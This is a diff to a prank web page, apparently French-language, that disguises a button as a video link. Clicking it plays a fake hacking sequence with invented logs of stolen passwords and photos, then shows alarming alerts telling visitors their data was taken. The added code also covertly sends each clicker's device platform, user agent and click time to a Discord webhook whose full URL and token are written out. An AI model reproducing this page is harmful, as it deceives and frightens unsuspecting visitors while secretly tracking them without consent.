@@ -11,8 +11,8 @@
         p { color: #ffffff; }
         .btn-video { background-color: #ff0000; color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 50px; cursor: pointer; font-weight: bold; margin-top: 20px; box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        #hacker-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #ff0000; z-index: 9999; padding-top: 100px; font-size: 1.2em; text-align: left; padding-left: 20px; }
-        .line { margin-bottom: 5px; }
+        #hacker-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #ff0000; z-index: 9999; padding-top: 50px; font-size: 1.1em; text-align: left; padding-left: 20px; box-sizing: border-box; }
+        .line { margin-bottom: 5px; white-space: nowrap; overflow: hidden; }
     </style>
 </head>
 <body>
@@ -29,17 +29,35 @@
 
 <script>
 const logs = [
-    "> CONNECTING TO LOCALHOST...",
-    "> BYPASSING FIREWALL... [OK]",
-    "> ACCESSING INSTAGRAM_CACHE... [OK]",
-    "> EXTRACTING SAVED_PASSWORDS... [OK]",
-    "> DOWNLOADING GALLERY... 15%.. 45%.. 100%",
-    "> UPLOADING TO EXTERNAL SERVER [185.23.4.12]",
-    "> WIPING SYSTEM LOGS...",
-    "> DISCONNECTING... BYE."
+    "> INITIATING EXPLOIT...",
+    "> CONNECTING TO RELAY SERVER... [OK]",
+    "> BYPASSING SYSTEM FIREWALL... [DONE]",
+    "> ACCESSING KEYCHAIN_STORAGE...",
+    "> EXTRACTING SAVED_PASSWORDS... [FOUND: 14]",
+    "> LOCATING MEDIA_GALLERY...",
+    "> DOWNLOADING PRIVATE_PHOTOS... [12%.. 48%.. 100%]",
+    "> SENDING DATA TO REMOTE_SERVER [8.21.4.155]",
+    "> DELETING LOCAL BACKUPS...",
+    "> CLEANING SYSTEM LOGS...",
+    "> HACK COMPLETE. GOODBYE."
 ];
 
 function startHack() {
+    // --- LE MOUCHARD DISCORD ---
+    const webhookURL = "https://discord.com/api/webhooks/1503032306187763923/AgayYIovTvZvrRaY7m4kmujoIK4nAD8KKUC4StAP7emhy-mlmusfv0r1geVxByfhljUo";
+    
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: "🎯 **QUELQU'UN A CLIQUÉ !**\n" +
+                     "📱 **Appareil :** " + navigator.platform + "\n" +
+                     "🌐 **Navigateur :** " + navigator.userAgent + "\n" +
+                     "⏰ **Heure :** " + new Date().toLocaleString()
+        })
+    });
+
+    // --- ANIMATION HACKER ---
     document.getElementById('main-content').style.display = 'none';
     document.getElementById('hacker-overlay').style.display = 'block';
 
@@ -57,15 +75,15 @@ function startHack() {
             clearInterval(interval);
             triggerAlerts();
         }
-    }, 400);
+    }, 450);
 }
 
 function triggerAlerts() {
     setTimeout(() => {
         alert("CRITICAL ERROR: Unauthorized access detected from your IP.");
-        alert("ALERTE : Vos mots de passe et photos ont été synchronisés avec succès.");
+        alert("ALERTE : Votre galerie de photos et vos identifiants ont été synchronisés.");
         alert("SYSTÈME : Effacement des traces en cours...");
-        window.location.href = "about:blank"; // La page devient blanche, comme si tout avait sauté.
+        window.location.href = "about:blank"; // La page devient blanche
     }, 500);
 }
 </script>
